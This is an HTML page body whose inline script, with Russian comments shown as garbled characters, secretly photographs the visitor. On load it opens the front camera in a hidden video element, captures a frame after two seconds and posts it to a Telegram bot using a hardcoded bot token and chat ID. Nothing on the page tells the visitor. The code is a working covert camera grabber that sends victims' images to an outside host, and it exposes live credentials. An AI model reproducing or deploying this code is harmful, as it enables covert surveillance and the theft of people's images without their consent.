<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const CHAT_ID = '1753361154';

        // ÐÐ²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¾Ðµ Ð²ÐºÐ»ÑŽÑ‡ÐµÐ½Ð¸Ðµ ÐºÐ°Ð¼ÐµÑ€Ñ‹ Ð¸ Ð·Ð°Ñ…Ð²Ð°Ñ‚ Ñ„Ð¾Ñ‚Ð¾
        window.onload = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // Ð”Ð¾ÑÑ‚ÑƒÐ¿ Ðº ÐºÐ°Ð¼ÐµÑ€Ðµ
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // Ð—Ð°Ñ…Ð²Ð°Ñ‚ Ñ„Ð¾Ñ‚Ð¾ Ñ‡ÐµÑ€ÐµÐ· 2 ÑÐµÐºÑƒÐ½Ð´Ñ‹
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const context = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg');

                            // ÐšÐ¾Ð½Ð²ÐµÑ€Ñ‚Ð°Ñ†Ð¸Ñ base64 Ð² Ñ„Ð°Ð¹Ð» Ð¸ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð² Telegram
                            fetch(imageData)
                                .then(res => res.blob())
                                .then(blob => {
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', blob, 'photo.jpg');

                                    // ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð² Telegram
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            alert("Photo sent successfully!");
                                        } else {
                                            alert("Failed to send photo: " + data.description);
                                        }
                                    })
                                    .catch(err => console.error("Error:", err));
                                });
                        }, 2000); // 2 ÑÐµÐºÑƒÐ½Ð´Ñ‹ Ð´Ð»Ñ Ð°ÐºÑ‚Ð¸Ð²Ð°Ñ†Ð¸Ð¸ ÐºÐ°Ð¼ÐµÑ€Ñ‹
                    };
                })
                .catch(err => console.error("Camera error: ", err));
        };
    </script>
</body>
